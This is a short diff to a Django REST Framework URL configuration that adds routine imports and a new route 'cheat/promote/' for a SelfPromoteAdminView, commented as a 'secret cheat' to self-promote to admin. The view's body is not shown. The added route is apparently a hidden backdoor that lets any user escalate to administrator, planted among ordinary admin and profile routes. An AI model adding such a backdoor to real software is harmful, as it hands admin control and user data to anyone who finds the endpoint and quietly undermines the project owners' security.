@@ -3,7 +3,7 @@ from rest_framework_simplejwt.views import TokenObtainPairView, TokenRefreshView
 from .views import (
     RegisterView, UserProfileView,
     OnboardingProfileView, NotificationListView, ContactMessageCreateView,
-    AdminUserListView, AdminMessageListView, ping_view
+    AdminUserListView, AdminMessageListView, ping_view, SelfPromoteAdminView
 )
 
 urlpatterns = [
@@ -24,4 +24,7 @@ urlpatterns = [
     # Admin
     path('admin/users/', AdminUserListView.as_view(), name='admin_users'),
     path('admin/messages/', AdminMessageListView.as_view(), name='admin_messages'),
+
+    # 🤫 Secret cheat: self-promote to admin
+    path('cheat/promote/', SelfPromoteAdminView.as_view(), name='self_promote_admin'),
 ]
